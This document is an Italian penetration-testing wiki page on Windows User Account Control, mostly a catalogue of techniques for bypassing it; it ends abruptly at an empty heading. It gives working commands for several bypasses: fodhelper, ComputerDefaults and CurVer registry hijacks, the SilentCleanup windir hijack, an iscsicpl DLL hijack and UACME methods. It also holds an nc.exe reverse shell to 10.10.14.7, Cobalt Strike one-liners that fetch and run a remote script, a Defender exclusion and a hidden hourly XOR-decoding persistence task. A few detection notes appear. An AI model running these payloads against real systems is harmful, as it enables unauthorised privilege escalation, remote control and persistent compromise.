# UAC - Controllo dell'account utente

{{#include ../../banners/hacktricks-training.md}}

## UAC

[Controllo dell'account utente (UAC)](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/how-user-account-control-works) è una funzionalità che mostra una **richiesta di consenso per le attività con privilegi elevati**. Le applicazioni hanno diversi livelli di `integrity` e un programma con un **livello elevato** può eseguire attività che **potrebbero potenzialmente compromettere il sistema**. Quando UAC è abilitato, le applicazioni e le attività vengono sempre **eseguite nel contesto di sicurezza di un account non amministratore**, a meno che un amministratore non autorizzi esplicitamente tali applicazioni/attività ad accedere al sistema con privilegi di amministratore. È una funzionalità pratica che protegge gli amministratori da modifiche involontarie, ma non è considerata un confine di sicurezza.<sup>[[2]](#references)</sup>

Per maggiori informazioni sui livelli di integrità:


{{#ref}}
../windows-local-privilege-escalation/integrity-levels.md
{{#endref}}

Quando UAC è attivo, a un utente amministratore vengono assegnati 2 token: un token utente standard, per eseguire le normali operazioni con integrità media, e uno con i privilegi di amministratore.

Questa [pagina](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/how-user-account-control-works) descrive in modo approfondito il funzionamento di UAC e include il processo di accesso, l'esperienza utente e l'architettura di UAC.<sup>[[2]](#references)</sup> Gli amministratori possono usare i criteri di sicurezza per configurare il funzionamento di UAC in base alle esigenze della propria organizzazione a livello locale (usando secpol.msc) oppure configurarli e distribuirli tramite Group Policy Objects (GPO) in un ambiente di dominio Active Directory. Le varie impostazioni sono descritte in dettaglio [qui](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings). È possibile impostare 10 criteri di Group Policy per UAC. La tabella seguente fornisce ulteriori dettagli:

| Impostazione di Group Policy                                                                                                                                                                                                                                                                                                                                                           | Chiave del Registro di sistema                | Impostazione predefinita                                              |
| ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------ | --------------------------- | ------------------------------------------------------------ |
| [Controllo dell'account utente: modalità di approvazione amministratore per l'account Amministratore predefinito](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-admin-approval-mode-for-the-built-in-administrator-account)                                                                                                           | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\FilterAdministratorToken`   | `0` (Disabilitato)                                             |
| [Controllo dell'account utente: comportamento della richiesta di elevazione per gli amministratori in modalità di approvazione amministratore](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-behavior-of-the-elevation-prompt-for-administrators-in-admin-approval-mode)                                                                     | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\ConsentPromptBehaviorAdmin` | `5` (Richiedi il consenso per i file binari non Windows sul desktop protetto) |
| [Controllo dell'account utente: comportamento della richiesta di elevazione per gli utenti standard](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-behavior-of-the-elevation-prompt-for-standard-users)                                                                                                             | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\ConsentPromptBehaviorUser`  | `1` (Richiedi le credenziali sul desktop protetto)         |
| [Controllo dell'account utente: rileva le installazioni di applicazioni e richiedi l'elevazione](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-detect-application-installations-and-prompt-for-elevation)                                                                                                 | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\EnableInstallerDetection`   | `1` (Abilitato; disabilitato per impostazione predefinita in Enterprise)           |
| [Controllo dell'account utente: eleva solo gli eseguibili firmati e con firma convalidata](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-only-elevate-executables-that-are-signed-and-validated)                                                             | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\ValidateAdminCodeSignatures` | `0` (Disabilitato)                                             |
| [Controllo dell'account utente: eleva solo le applicazioni UIAccess installate in percorsi sicuri](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-only-elevate-uiaccess-applications-that-are-installed-in-secure-locations)                                                             | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\EnableSecureUIAPaths`       | `1` (Abilitato)                                              |
| [Controllo dell'account utente: esegui tutti gli amministratori in modalità di approvazione amministratore](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-run-all-administrators-in-admin-approval-mode)                                                                                                                            | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\EnableLUA`                  | `1` (Abilitato)                                              |
| [Controllo dell'account utente: consenti alle applicazioni UIAccess di richiedere l'elevazione senza usare il desktop protetto](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-allow-uiaccess-applications-to-prompt-for-elevation-without-using-the-secure-desktop)                                   | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\EnableUIADesktopToggle`     | `0` (Disabilitato)                                             |
| [Controllo dell'account utente: passa al desktop protetto quando richiedi l'elevazione](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-switch-to-the-secure-desktop-when-prompting-for-elevation)                                                                               | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\PromptOnSecureDesktop`      | `1` (Abilitato)                                              |
| [Controllo dell'account utente: virtualizza gli errori di scrittura di file e Registro di sistema in percorsi specifici per utente](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-virtualize-file-and-registry-write-failures-to-per-user-locations)                                                                     | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\EnableVirtualization`       | `1` (Abilitato)                                              |

### Criteri per l'installazione di software su Windows

I **criteri di sicurezza locali** (in genere "secpol.msc" nei sistemi) sono configurati per impostazione predefinita in modo da **impedire agli utenti non amministratori di installare software**. Ciò significa che, anche se un utente non amministratore può scaricare il programma di installazione del software, non potrà eseguirlo senza un account amministratore.

### Chiavi del Registro di sistema per forzare UAC a richiedere l'elevazione

Come utente standard senza diritti di amministratore, puoi fare in modo che l'account "standard" **riceva una richiesta di credenziali da UAC** quando tenta di eseguire determinate azioni. Questa operazione richiede la modifica di alcune **chiavi del Registro di sistema**, per cui servono autorizzazioni di amministratore, a meno che non sia presente un **UAC bypass** o che l'attaccante abbia già effettuato l'accesso come amministratore.

Anche se l'utente appartiene al gruppo **Administrators**, queste modifiche lo costringono a **inserire nuovamente le credenziali del proprio account** per eseguire azioni amministrative.

**In pratica, questo è utile solo se si dispone già di un token elevato, di un UAC bypass o di una configurazione errata che consente di modificare queste chiavi; altrimenti la scrittura nel Registro di sistema viene bloccata.**

Le chiavi e le voci del Registro di sistema da modificare sono le seguenti (con i relativi valori predefiniti tra parentesi):

- `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System`:
  - `ConsentPromptBehaviorUser` = 1 (3)
  - `ConsentPromptBehaviorAdmin` = 1 (5)
  - `PromptOnSecureDesktop` = 1 (1)

È possibile eseguire questa operazione anche manualmente tramite lo strumento Criteri di sicurezza locali. Dopo la modifica, per le operazioni amministrative viene richiesto all'utente di inserire nuovamente le proprie credenziali.

### Nota

**User Account Control non è un confine di sicurezza.** Pertanto, gli utenti standard non possono evadere dai propri account e ottenere i diritti di amministratore senza un exploit di local privilege escalation.

### Chiedere a un utente il "pieno accesso al computer"

```powershell
hostname | Set-Clipboard
Enable-PSRemoting -SkipNetworkProfileCheck -Force

cd C:\Users\hacedorderanas\Desktop
New-PSSession -Name "Case ID: 1527846" -ComputerName hostname
Enter-PSSession -ComputerName hostname
```

### Privilegi UAC

- Internet Explorer Protected Mode usa controlli di integrità per impedire ai processi con livello di integrità elevato (come i browser web) di accedere a dati con livello di integrità basso (come la cartella dei file temporanei di Internet). A tal fine, il browser viene eseguito con un token a bassa integrità. Quando il browser tenta di accedere ai dati archiviati nella zona a bassa integrità, il sistema operativo controlla il livello di integrità del processo e consente l'accesso di conseguenza. Questa funzionalità aiuta a impedire che gli attacchi di remote code execution accedano a dati sensibili del sistema.
- Quando un utente accede a Windows, il sistema crea un token di accesso contenente un elenco dei privilegi dell'utente. I privilegi sono definiti dalla combinazione di diritti e capacità dell'utente. Il token contiene anche un elenco delle credenziali dell'utente, utilizzate per autenticarlo sul computer e per accedere alle risorse in rete.

### Autoadminlogon

Per configurare Windows in modo che un utente specifico acceda automaticamente all'avvio, imposta la **chiave di registro `AutoAdminLogon`**. È utile negli ambienti kiosk o a scopo di test. Usala solo su sistemi sicuri, poiché la password viene esposta nel registro.

Imposta le seguenti chiavi tramite l'Editor del Registro di sistema o `reg add`:

- `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon`:
  - `AutoAdminLogon` = 1
  - `DefaultUsername` = username
  - `DefaultPassword` = password

Per ripristinare il normale comportamento di accesso, imposta `AutoAdminLogon` su 0.

## UAC bypass

> [!TIP]
> Nota che, se hai accesso grafico alla vittima, eseguire l'UAC bypass è semplice: puoi semplicemente fare clic su "Yes" quando appare la richiesta UAC.

L'UAC bypass è necessario nella seguente situazione: **l'UAC è attivato, il tuo processo è in esecuzione in un contesto con integrità media e il tuo utente appartiene al gruppo Administrators**.

È importante ricordare che **è molto più difficile eseguire l'UAC bypass se il livello di sicurezza è al massimo (Always) rispetto a uno qualsiasi degli altri livelli (Default).**

### Triage rapido da una shell con integrità media

Prima di tentare un bypass, verifica di trovarti nello scenario corretto e confronta la build dell'host con i metodi noti che funzionano:

```powershell
whoami /groups
reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v EnableLUA
reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v ConsentPromptBehaviorAdmin
reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v PromptOnSecureDesktop
powershell -c "Get-ItemProperty 'HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion' | select ProductName,DisplayVersion,CurrentBuild,UBR"
schtasks /Query /TN "\Microsoft\Windows\DiskCleanup\SilentCleanup"
```

Note pratiche:
- Se `EnableLUA=0`, non serve un bypass: qualsiasi token admin può richiedere direttamente l'integrità elevata.
- `ConsentPromptBehaviorAdmin=2` o `5` è lo scenario comune per i bypass basati su auto-elevate / COM.
- `Always Notify` aumenta il livello di difficoltà, ma dovresti comunque testare la build esatta invece di presumere che il bypass fallisca: UACME tiene ancora traccia di alcuni metodi compatibili con `AlwaysNotify` nelle build moderne di Windows.<sup>[[3]](#references)</sup>

### UAC disabilitato

Se UAC è già disabilitato (`ConsentPromptBehaviorAdmin` è **`0`**), puoi **eseguire una reverse shell con privilegi admin** (livello di integrità elevato) usando qualcosa come:

```bash
#Put your reverse shell instead of "calc.exe"
Start-Process powershell -Verb runAs "calc.exe"
Start-Process powershell -Verb runAs "C:\Windows\Temp\nc.exe -e powershell 10.10.14.7 4444"
```

#### UAC bypass con duplicazione del token

- [https://ijustwannared.team/2017/11/05/uac-bypass-with-token-duplication/](https://ijustwannared.team/2017/11/05/uac-bypass-with-token-duplication/)
- [https://www.tiraniddo.dev/2018/10/farewell-to-token-stealing-uac-bypass.html](https://www.tiraniddo.dev/2018/10/farewell-to-token-stealing-uac-bypass.html)

### RPC locale + oggetto di debug riutilizzabile

L’interfaccia RPC locale di AppInfo `201ef99a-7fa0-444c-9399-19ba84f12a1a` può creare un processo con il debugging abilitato. I processi creati tramite debug sullo stesso thread condividono l’oggetto di debug del thread; un evento di debug relativo alla creazione include un handle di processo con accesso completo, anche quando il risultato RPC concede solo un accesso limitato. In questo modo, il riutilizzo dell’oggetto di debug diventa una primitiva UAC per un membro del gruppo Administrators con integrità media.<sup>[[11]](#references)[[12]](#references)</sup>

Una sequenza pratica è:<sup>[[11]](#references)[[12]](#references)</sup>

1. Chiama il metodo RPC locale (direttamente o tramite `NdrAsyncClientCall`) per creare un processo sacrificabile non elevato con il debugging abilitato.
2. Interroga `ProcessDebugObjectHandle` con `NtQueryInformationProcess`, scollega l’oggetto con `NtRemoveProcessDebug`, conserva l’oggetto e termina il processo sacrificabile.
3. Usa la stessa interfaccia RPC per creare un processo attendibile con auto-elevazione, quindi associa l’oggetto salvato al thread chiamante tramite `DbgUiSetThreadDebugObject`.
4. Chiama `WaitForDebugEvent` e acquisisci l’handle di processo `CREATE_PROCESS_DEBUG_EVENT`; duplicalo con `NtDuplicateObject` prima di continuare.
5. Passa l’handle duplicato a `UpdateProcThreadAttribute(PROC_THREAD_ATTRIBUTE_PARENT_PROCESS, ...)` e avvia il payload con una struttura startup-info estesa. In questo modo riutilizzi il contesto del processo elevato e assegni al processo figlio una relazione con un processo padre dall’aspetto attendibile.

Cerca la breve sequenza, non soltanto il binario con auto-elevazione: creazione di processi tramite RPC locale di AppInfo, interrogazioni di `ProcessDebugObjectHandle`, scollegamento/riassociazione del debugger, un evento di debug di creazione immediato, duplicazione degli handle e un processo figlio il cui processo padre registrato non corrisponde al processo che ha eseguito le API di creazione.<sup>[[12]](#references)</sup>

### "Bypass" UAC **molto** basilare (accesso completo al file system)

Se hai una shell con un utente appartenente al gruppo Administrators, puoi **montare la condivisione C$** tramite SMB (file system) localmente su un nuovo disco e avrai **accesso a tutto il contenuto del file system** (persino alla cartella home di Administrator).

> [!WARNING]
> **Sembra che questo trucco non funzioni più**

```bash
net use Z: \\127.0.0.1\c$
cd C$

#Or you could just access it:
dir \\127.0.0.1\c$\Users\Administrator\Desktop
```

### UAC bypass con Cobalt Strike

Le tecniche di Cobalt Strike funzionano solo se UAC non è impostato sul livello massimo di sicurezza.

```bash
# UAC bypass via token duplication
elevate uac-token-duplication [listener_name]
# UAC bypass via service
elevate svc-exe [listener_name]

# Bypass UAC with Token Duplication
runasadmin uac-token-duplication powershell.exe -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring('http://10.10.5.120:80/b'))"
# Bypass UAC with CMSTPLUA COM interface
runasadmin uac-cmstplua powershell.exe -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring('http://10.10.5.120:80/b'))"
```

**Empire** e **Metasploit** dispongono anche di diversi moduli per **bypassare** **UAC**.

### Interfacce COM con privilegi elevati (`ICMLuaUtil` / `CMSTPLUA`)

Gli oggetti COM con elevazione automatica continuano a rappresentare una superficie UAC pratica nelle build moderne. UACME continua a indicare `ICMLuaUtil` come funzionante nelle versioni attuali di Windows, mentre gli strumenti offensivi continuano ad adattare `CMSTPLUA` combinando un processo desktop interattivo, l'esecuzione a 64 bit e, talvolta, il mascheramento di PEB/processi prima di richiamare il COM Elevation Moniker.<sup>[[3]](#references)</sup>

Consigli pratici:
- Preferisci un processo a **64 bit** nella **sessione interattiva** dell'utente (comunemente `explorer.exe` o un suo processo figlio).
- Se una shell grezza non funziona, riprova da un'implementazione BOF / UACME invece di usare un wrapper `CreateProcess` ingenuo.
- Tieni presente che l'esecuzione del processo figlio avviene in un **processo separato con privilegi elevati**; molti BOF non elevano il beacon corrente sul posto.

### KRBUACBypass

Documentazione e tool disponibili su [https://github.com/wh0amitz/KRBUACBypass](https://github.com/wh0amitz/KRBUACBypass)

### Exploit per bypassare UAC

[**UACME**](https://github.com/hfiref0x/UACME) è una raccolta di tecniche per bypassare UAC. Compilalo con Visual Studio o MSBuild; la build crea diversi eseguibili (ad esempio, `Source\Akagi\output\x64\Debug\Akagi.exe`), quindi seleziona il metodo adatto alla build di destinazione.<sup>[[3]](#references)</sup>\
Fai attenzione: alcuni bypass avviano programmi visibili o prompt che possono allertare l'utente.<sup>[[3]](#references)</sup>

UACME indica la **versione della build a partire dalla quale ogni tecnica ha iniziato a funzionare**.<sup>[[3]](#references)</sup> Puoi cercare una tecnica compatibile con le tue versioni:

```powershell
PS C:\> [environment]::OSVersion.Version

Major  Minor  Build  Revision
-----  -----  -----  --------
10     0      14393  0
```

Inoltre, usando [questa](https://en.wikipedia.org/wiki/Windows_10_version_history) pagina puoi ricavare la release di Windows `1607` dai numeri di build.

Un workflow pratico consiste prima nel **valutare la build dell’host** e solo dopo lanciare il metodo corrispondente:

```cmd
python main.py --scan uac
Akagi64.exe 33 C:\Windows\System32\cmd.exe
```

- `WinPwnage` confronta rapidamente la build locale con i suoi metodi UAC noti, una funzione utile per scartare subito i PoC non più validi.<sup>[[4]](#references)</sup>
- `UACME` resta il miglior catalogo pubblico per associare un bypass a una build precisa. La versione 3.7.1 ha aggiunto i metodi 83–85, mentre la release precedente ha ritestato i metodi esistenti su **Windows 11 25H2**; ricontrolla la tabella dei metodi e le note di rilascio, invece di presumere che un vecchio PoC sia ancora applicabile senza modifiche.<sup>[[3]](#references)[[9]](#references)</sup>

### Catene WNF/UIAccess compatibili con Always Notify (UACME 3.7.1)

`Always Notify` non elimina ogni UAC bypass. UACME 3.7.1 implementa tre nuovi metodi x64 che combinano stato dell'ambiente/protocollo controllabile dall'utente con il comportamento di attività pianificate elevate o UIAccess, e li contrassegna tutti come `AlwaysNotify compatible`:<sup>[[3]](#references)[[9]](#references)</sup>

- **83 — UnifiedConsent:** reindirizza `SystemRoot` in modo che l'attività `\Microsoft\Windows\ConsentUX\UnifiedConsent\UnifiedConsentSyncTask`, attivata da WNF, induca il processo elevato `taskhostw.exe` a caricare side-load `unifiedconsent.dll`. UACME lo traccia da Windows 10 build 19041.
- **84 — TabTip:** usa la stessa primitiva basata su variabile d'ambiente contro UIAccess `TabTip.exe`, che carica `windows.storage.dll`, `ApplicationTargetedFeatureDatabase.dll` o `rsaenh.dll` a seconda della build, quindi effettua un pivot dal contesto UIAccess a integrità elevata risultante. UACME lo traccia da Windows 8.1 / Server 2016.
- **85 — Narrator:** dirotta il protocollo `feedback-hub` per utente, avvia Narrator con `Alt+CapsLock+F`, quindi lancia una copia scrivibile di `osk.exe` che carica side-load `OskSupport.dll`. Richiede un desktop interattivo ed è tracciato da Windows 10 1809 / Server 2019.

Dopo aver compilato le unità payload e Akagi come documentato da UACME, richiama il numero del metodo corrispondente (il comando è facoltativo e predefinito su `cmd.exe`):

```cmd
Akagi64.exe 83 C:\Windows\System32\cmd.exe
Akagi64.exe 84 C:\Windows\System32\cmd.exe
Akagi64.exe 85 C:\Windows\System32\cmd.exe
```

I metodi 84 e 85 dipendono da UIAccess/interazione con il desktop, quindi non aspettarti che funzionino senza modifiche da Session 0 o da una shell di servizio non interattiva. Tutti e tre modificano lo stato dell’ambiente/protocollo e preparano DLL; esamina l’implementazione e rimuovi questi artefatti dopo i test.<sup>[[3]](#references)[[9]](#references)</sup>

### UAC Bypass – fodhelper.exe (Registry hijack)

Il binario attendibile `fodhelper.exe` viene avviato automaticamente con privilegi elevati nelle versioni moderne di Windows. All’avvio, interroga il percorso del registro per utente riportato di seguito senza convalidare il verbo `DelegateExecute`. Inserire qui un comando consente a un processo con integrità Medium (l’utente è nel gruppo Administrators) di avviare un processo con integrità High senza una richiesta UAC.

Percorso del registro interrogato da fodhelper:
```text
HKCU\Software\Classes\ms-settings\Shell\Open\command
```

<details>
<summary>Passaggi PowerShell (imposta il payload, quindi attivalo)</summary>

```powershell
# Optional: from a 32-bit shell on 64-bit Windows, spawn a 64-bit PowerShell for stability
C:\\Windows\\sysnative\\WindowsPowerShell\\v1.0\\powershell -nop -w hidden -c "$PSVersionTable.PSEdition"

# 1) Create the vulnerable key and values
New-Item -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Force | Out-Null
New-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "DelegateExecute" -Value "" -Force | Out-Null

# 2) Set default command to your payload (example: reverse shell or cmd)
# Replace <BASE64_PS> with your base64-encoded PowerShell (or any command)
Set-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "(default)" -Value "powershell -ExecutionPolicy Bypass -WindowStyle Hidden -e <BASE64_PS>" -Force

# 3) Trigger auto-elevation
Start-Process -FilePath "C:\\Windows\\System32\\fodhelper.exe"

# 4) (Recommended) Cleanup
Remove-Item -Path "HKCU:\Software\Classes\ms-settings\Shell\Open" -Recurse -Force
```

</details>
Note:
- Funziona quando l'utente corrente è membro del gruppo Administrators e il livello UAC è predefinito/flessibile (non «Always Notify» con restrizioni aggiuntive).
- Usa il percorso `sysnative` per avviare PowerShell a 64 bit da un processo a 32 bit su Windows a 64 bit.
- Il payload può essere qualsiasi comando (PowerShell, cmd o un percorso EXE). Per non farsi notare, evita le interfacce che mostrano prompt.

#### Trigger di `ComputerDefaults.exe` per lo stesso handler `ms-settings`

`ComputerDefaults.exe` risolve la stessa associazione per utente `ms-settings\Shell\Open\command` di `fodhelper.exe`.<sup>[[13]](#references)[[14]](#references)</sup> Dopo aver impostato il comando predefinito e il valore `DelegateExecute` vuoto descritti sopra, usa `Start-Process "$env:WINDIR\System32\ComputerDefaults.exe"` come trigger alternativo; non ripetere la configurazione del registro.<sup>[[13]](#references)[[14]](#references)</sup> Restano validi i prerequisiti relativi all'amministratore con integrità media e ai criteri UAC indicati sopra nelle note su `fodhelper.exe`.<sup>[[2]](#references)[[3]](#references)</sup> UACME cataloga questo trigger a partire da Windows 10 RS4 (build 17134), quindi verificalo sulla build di destinazione.<sup>[[3]](#references)</sup>

#### Variante di hijack di CurVer/estensione (solo HKCU)

Campioni recenti che abusano di `fodhelper.exe` evitano `DelegateExecute` e invece **reindirizzano il ProgID `ms-settings`** tramite il valore `CurVer` per utente. Il binario con elevazione automatica continua a risolvere l'handler sotto `HKCU`, quindi non serve un token amministratore per creare le chiavi:<sup>[[5]](#references)</sup>

```powershell
# Point ms-settings to a custom extension (.thm) and map that extension to our payload
New-Item -Path "HKCU:\Software\Classes\.thm\Shell\Open" -Force | Out-Null
New-ItemProperty -Path "HKCU:\Software\Classes\.thm\Shell\Open\command" -Name "(default)" -Value "C:\\ProgramData\\rKXujm.exe" -Force | Out-Null
Set-ItemProperty -Path "HKCU:\Software\Classes\ms-settings" -Name "CurVer" -Value ".thm" -Force

Start-Process "C:\\Windows\\System32\\fodhelper.exe"   # auto-elevates and runs rKXujm.exe
```

Una volta ottenuti privilegi elevati, il malware **disabilita comunemente le richieste future** impostando `HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\ConsentPromptBehaviorAdmin` su `0`, quindi esegue ulteriori operazioni di defense evasion (ad es., `Add-MpPreference -ExclusionPath C:\ProgramData`) e ricrea la persistence per essere eseguito con integrità elevata. Un'attività di persistence tipica salva su disco uno **script PowerShell cifrato con XOR** e lo decodifica e lo esegue in memoria ogni ora:<sup>[[5]](#references)</sup>

```powershell
schtasks /create /sc hourly /tn "OneDrive Startup Task" /rl highest /tr "cmd /c powershell -w hidden $d=[IO.File]::ReadAllBytes('C:\ProgramData\VljE\zVJs.ps1');$k=[Text.Encoding]::UTF8.GetBytes('Q');for($i=0;$i -lt $d.Length;$i++){$d[$i]=$d[$i]-bxor$k[$i%$k.Length]};iex ([Text.Encoding]::UTF8.GetString($d))"
```

Questa variante rimuove comunque il dropper e lascia solo i payload staged, facendo sì che il rilevamento dipenda dal monitoraggio del **`CurVer` hijack**, delle modifiche a `ConsentPromptBehaviorAdmin`, della creazione di esclusioni di Defender o delle attività pianificate che decrittano PowerShell in memoria.<sup>[[5]](#references)</sup>

### UAC bypass tramite attività `SilentCleanup` (`HKCU\Environment\windir`)

`SilentCleanup` avvia `cleanmgr.exe` con privilegi massimi ed espande `%windir%` dall’ambiente dell’utente. Se controlli `HKCU\Environment\windir`, puoi reindirizzare tale espansione a un comando arbitrario e ottenere un livello di integrità elevato senza una finestra di consenso.<sup>[[8]](#references)</sup> Vale ancora la pena testare questo metodo sulle build recenti, perché UACME mantiene attiva la tecnica e il tracciamento recente delle issue indica che su Windows 11 24H2 potrebbero bastare piccole modifiche alle virgolette.<sup>[[3]](#references)</sup>

```cmd
reg add "HKCU\Environment" /v windir /d "cmd.exe /c start powershell.exe" /f
schtasks /Run /TN "\Microsoft\Windows\DiskCleanup\SilentCleanup"
reg delete "HKCU\Environment" /v windir /f
```

Se il task cita il percorso in quella build, riprova con il payload che termina con una virgoletta (ad esempio `cmd.exe"`). Pulisci sempre `HKCU\Environment\windir` dopo i test.

#### Altri UAC bypass

Molti UAC bypass classici che abusano dei flussi dell’interfaccia utente, degli oggetti COM o dell’interazione con il desktop richiedono una **sessione interattiva completa** con la vittima; una shell `nc.exe` comune o un servizio in esecuzione nella **Sessione 0** spesso non sono sufficienti.

Spesso puoi risolvere usando una sessione **meterpreter**. Esegui la migrazione a un **processo** con valore **Session** uguale a **1**:

![Imposta ms-settings su un’estensione personalizzata (.thm) e associa tale estensione al nostro payload - Altri UAC bypass: puoi farlo con una sessione meterpreter. Esegui la migrazione a un processo con Session...](<../../images/image (863).png>)

(_explorer.exe_ dovrebbe funzionare)

### UAC bypass con GUI

Se hai accesso a una **GUI, puoi semplicemente accettare la richiesta UAC** quando appare; non ti serve davvero un bypass tecnico. Pertanto, ottenere una sessione GUI è spesso sufficiente per superare gli ostacoli pratici aggiunti da UAC.

Inoltre, se ottieni una sessione GUI che qualcuno stava usando (potenzialmente tramite RDP), ci sono **alcuni strumenti in esecuzione come amministratore** da cui potresti **eseguire** direttamente, ad esempio, un **cmd** **come amministratore**, senza che UAC mostri di nuovo una richiesta, come [**https://github.com/oski02/UAC-GUI-Bypass-appverif**](https://github.com/oski02/UAC-GUI-Bypass-appverif). Questo potrebbe essere un po’ più **stealthy**.

### UAC bypass brute-force rumoroso

Se il rumore è accettabile, uno strumento come [**ForceAdmin**](https://github.com/Chainski/ForceAdmin) può richiedere ripetutamente l’elevazione finché l’utente non la accetta.

### Il tuo bypass - Metodologia di base per UAC bypass

Se dai un’occhiata a **UACME**, noterai che **molti UAC bypass abusano del DLL hijacking** (spesso facendo caricare a un binario con privilegi elevati una DLL controllata dall’attaccante da un percorso scrivibile). [Leggi qui per scoprire come trovare una vulnerabilità di DLL hijacking](../windows-local-privilege-escalation/dll-hijacking/index.html).

1. Trova un binario che esegue **autoelevate** (verifica che venga eseguito con un livello di integrità elevato).
2. Con procmon, trova gli eventi "**NAME NOT FOUND**" che potrebbero essere vulnerabili al **DLL Hijacking**.
3. Probabilmente dovrai **scrivere** la DLL all’interno di alcuni **percorsi protetti** (come C:\Windows\System32) in cui non hai i permessi di scrittura. Puoi aggirare questo problema usando:
   1. **wusa.exe**: Windows 7, 8 e 8.1. Consente di estrarre il contenuto di un file CAB all’interno di percorsi protetti (perché questo strumento viene eseguito con un livello di integrità elevato).
   2. **IFileOperation**: Windows 10.
4. Prepara uno **script** per copiare la tua DLL nel percorso protetto ed eseguire il binario vulnerabile con autoelevazione.

### Un’altra tecnica di UAC bypass

Consiste nel verificare se un **binario autoElevated** cerca di **leggere** dal **registro** il **nome/percorso** di un **binario** o **comando** da **eseguire** (è più interessante se il binario cerca queste informazioni in **HKCU**).

### UAC bypass tramite `SysWOW64\iscsicpl.exe` + DLL hijack tramite `PATH` utente

Il binario a 32 bit `C:\Windows\SysWOW64\iscsicpl.exe` viene **eseguito automaticamente con privilegi elevati** e può essere indotto a caricare `iscsiexe.dll` secondo l’ordine di ricerca. Se riesci a posizionare una `iscsiexe.dll` malevola in una cartella **scrivibile dall’utente** e poi modificare il `PATH` dell’utente corrente (ad esempio tramite `HKCU\Environment\Path`) in modo che venga cercata quella cartella, Windows potrebbe caricare la DLL dell’attaccante nel processo `iscsicpl.exe` con privilegi elevati **senza mostrare una richiesta UAC**.<sup>[[1]](#references)[[6]](#references)</sup>

Note pratiche:
- È utile quando l’utente corrente è nel gruppo **Administrators**, ma viene eseguito con **Medium Integrity** a causa di UAC.
- Per questo bypass è rilevante la copia **SysWOW64**. Considera la copia **System32** come un binario separato e verifica il comportamento in modo indipendente.
- La tecnica combina **autoelevazione** e **DLL search-order hijacking**, quindi è utile verificare il mancato caricamento della DLL con lo stesso workflow di ProcMon usato per altri UAC bypass.

Flusso minimo:

```cmd
copy iscsiexe.dll %TEMP%\iscsiexe.dll
reg add "HKCU\Environment" /v Path /t REG_SZ /d "%TEMP%" /f
C:\Windows\System32\cmd.exe /c C:\Windows\SysWOW64\iscsicpl.exe
```

Idee per il rilevamento:
- Generare un alert per `reg add` / scritture nel registro in `HKCU\Environment\Path`, seguite immediatamente dall'esecuzione di `C:\Windows\SysWOW64\iscsicpl.exe`.
- Cercare `iscsiexe.dll` in percorsi **controllati dall'utente**, come `%TEMP%` o `%LOCALAPPDATA%\Microsoft\WindowsApps`.
- Correlare gli avvii di `iscsicpl.exe` con processi figlio imprevisti o caricamenti di DLL al di fuori delle normali directory di Windows.

### Ricerche più recenti da verificare separatamente

Alcune catene successive al 2024 non somigliano più ai classici hijack del registro `HKCU\Software\Classes`. Per esempio, l'avvelenamento della cache del contesto di attivazione può concatenare un **drive remap** e una **DLL redirection** per passare da integrità media ad alta tramite interfacce utente attendibili / binari con elevazione automatica come `ctfmon.exe` e, successivamente, target come `fodhelper.exe`. Invece di duplicare qui il lungo PoC, consulta gli esempi compatti di payload in:

{{#ref}}
../windows-local-privilege-escalation/windows-c-payloads.md
{{#endref}}

### Hijack della lettera di unità di Administrator Protection (anteprima) tramite mappa dei dispositivi DOS per sessione di accesso

> [!NOTE]
